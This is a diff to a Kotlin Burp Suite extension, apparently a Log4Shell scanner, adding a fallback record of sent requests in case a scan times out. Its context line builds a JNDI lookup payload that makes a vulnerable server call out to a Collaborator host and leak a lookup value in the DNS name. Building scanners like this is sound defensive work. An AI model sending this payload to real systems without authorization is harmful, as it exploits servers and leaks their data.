@@ -72,7 +72,9 @@ class BurpExtender : IBurpExtender, IScannerCheck, IExtensionStateListener {
             val bytes = "\${jndi:ldap://$prefix\${$key}.$payload.${collaborator.collaboratorServerLocation}/s2test}".toByteArray()
             val request = insertionPoint!!.buildRequest(bytes)
             val poff = insertionPoint.getPayloadOffsets(bytes)
-            val hrr = callbacks.makeHttpRequest(baseRequestResponse!!.httpService, request)
+            val hs = baseRequestResponse!!.httpService
+            crontab[payload] = Pair(EarlyHttpRequestResponse(hs, request), poff) // fallback in case of timeout
+            val hrr = callbacks.makeHttpRequest(hs, request)
             val contextPair = Pair(hrr, poff)
             context.add(contextPair)
             collabResults.addAll(collaborator.fetchCollaboratorInteractionsFor(payload))
@@ -83,6 +85,19 @@ class BurpExtender : IBurpExtender, IScannerCheck, IExtensionStateListener {
             if (!thread.isAlive) thread.start()
         }
         return interactions
+    }
+
+    class EarlyHttpRequestResponse(private val hs: IHttpService, private val sentRequest: ByteArray) : IHttpRequestResponse {
+        override fun getComment(): String = ""
+        override fun getHighlight(): String = ""
+        override fun getHttpService(): IHttpService = hs
+        override fun getRequest(): ByteArray? = sentRequest
+        override fun getResponse(): ByteArray? = null
+        override fun setComment(comment: String?) {}
+        override fun setHighlight(color: String?) {}
+        override fun setHttpService(httpService: IHttpService?) {}
+        override fun setRequest(message: ByteArray?) {}
+        override fun setResponse(message: ByteArray?) {}
     }
 
     private fun handleInteractions(context: List<Pair<IHttpRequestResponse, IntArray>>,
